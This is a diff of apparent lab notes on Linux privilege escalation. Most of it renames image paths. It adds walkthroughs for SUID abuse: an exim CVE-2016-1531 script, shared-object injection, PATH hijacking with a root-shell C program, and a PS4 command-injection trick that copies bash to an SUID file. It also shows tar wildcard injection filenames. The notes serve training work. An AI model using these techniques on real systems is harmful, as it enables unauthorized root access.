@@ -172,7 +172,7 @@ Edit the /etc/passwd file and place the generated password hash between the firs
 vi /etc/passwd
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Victim**
 
@@ -250,9 +250,9 @@ TERM= sudo more /etc/profile
 !/bin/sh
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### **less**
 
@@ -267,7 +267,7 @@ sudo less /etc/profile
 
 <figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (2).png" alt=""><figcaption></figcaption></figure>
 
 This option did not work on this box as when you click v it opens nano instead of vi or vim. If you can someone set the environment variables VISUAL and/or EDITOR, you could get this to work but it would be difficult.
 
@@ -525,7 +525,7 @@ Wait for the cron job to run (should not take longer than a minute). Run the /tm
 /tmp/rootbash -p
 ```
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>
 
 ## Cron Jobs - Wildcards
 
@@ -537,7 +537,7 @@ View the contents of the other cron job script
 cat /usr/local/bin/compress.sh
 ```
 
-<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 Note that the tar command is being run with a wildcard (\*) in your home directory.
 
@@ -576,7 +576,7 @@ touch /home/user/--checkpoint=1
 touch /home/user/--checkpoint-action=exec=shell.elf
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 When the tar command in the cron job runs, the wildcard (\*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
 
@@ -589,3 +589,169 @@ nc -nvlp 4444
 ```
 
 <figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+
+## SUID / SGID Executables - Known Exploits
+
+Find all the SUID/SGID executables on the Debian VM.
+
+**Victim**
+
+```
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+```
+
+<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+
+Note that /usr/sbin/exim-4.84-3 appears in the results. Try to find a known exploit for this version of exim. Exploit-DB, Google, and GitHub are good places to search!
+
+A local privilege escalation exploit matching this version of exim exactly should be available. A copy can be found on the Debian VM at /home/user/tools/suid/exim/cve-2016-1531.sh.
+
+Run the exploit script to gain a root shell:
+
+**Victim**
+
+```
+/home/user/tools/suid/exim/cve-2016-1531.sh
+```
+
+<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+## SUID / SGID Executables - Shared Object Injection
+
+The /usr/local/bin/suid-so SUID executable is vulnerable to shared object injection.
+
+First, execute the file and note that currently it displays a progress bar before exiting.
+
+**Victim**
+
+```
+/usr/local/bin/suid-so
+```
+
+Run strace on the file and search the output for open/access calls and for "no such file" errors.
+
+**Victim**
+
+```
+strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+```
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+Note that the executable tries to load the /home/user/.config/libcalc.so shared object within our home directory, but it cannot be found.
+
+Create the .config directory for the libcalc.so file.
+
+**Victim**
+
+```
+mkdir /home/user/.config
+```
+
+Example shared object code can be found at /home/user/tools/suid/libcalc.c. It simply spawns a Bash shell. Compile the code into a shared object at the location the suid-so executable was looking for it.
+
+**Victim**
+
+```
+gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
+```
+
+Execute the suid-so executable again, and note that this time, instead of a progress bar, we get a root shell.
+
+**Victim**
+
+```
+/usr/local/bin/suid-so
+```
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+## SUID / SGID Executables - Environment Variables
+
+The /usr/local/bin/suid-env executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.
+
+First, execute the file and note that it seems to be trying to start the apache2 webserver.
+
+**Victim**
+
+```
+/usr/local/bin/suid-env
+```
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Run strings on the file to look for strings of printable characters.
+
+**Victim**
+
+```
+strings /usr/local/bin/suid-env
+```
+
+<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.
+
+Compile the code located at /home/user/tools/suid/service.c into an executable called service. This code simply spawns a Bash shell.
+
+**Victim**
+
+```
+gcc -o service /home/user/tools/suid/service.c
+```
+
+#### service.c
+
+```
+int main() {
+        setuid(0);
+        system("/bin/bash -p");
+}
+```
+
+Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell.
+
+**Victim**
+
+```
+PATH=.:$PATH /usr/local/bin/suid-env
+```
+
+
+
+
+
+## SUID / SGID Executables - Abusing Shell Features (#1)
+
+## SUID / SGID Executables - Abusing Shell Features (#2)
+
+Note: This will not work on Bash versions 4.4 and above.
+
+When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements. Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash.
+
+**Victim**
+
+```
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+```
+
+Run the /tmp/rootbash executable with -p to gain a shell running with root privileges.
+
+**Victim**
+
+```
+/tmp/rootbash -p
+```
+
+<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+##
+
+
+
+
+
+
+
+
+
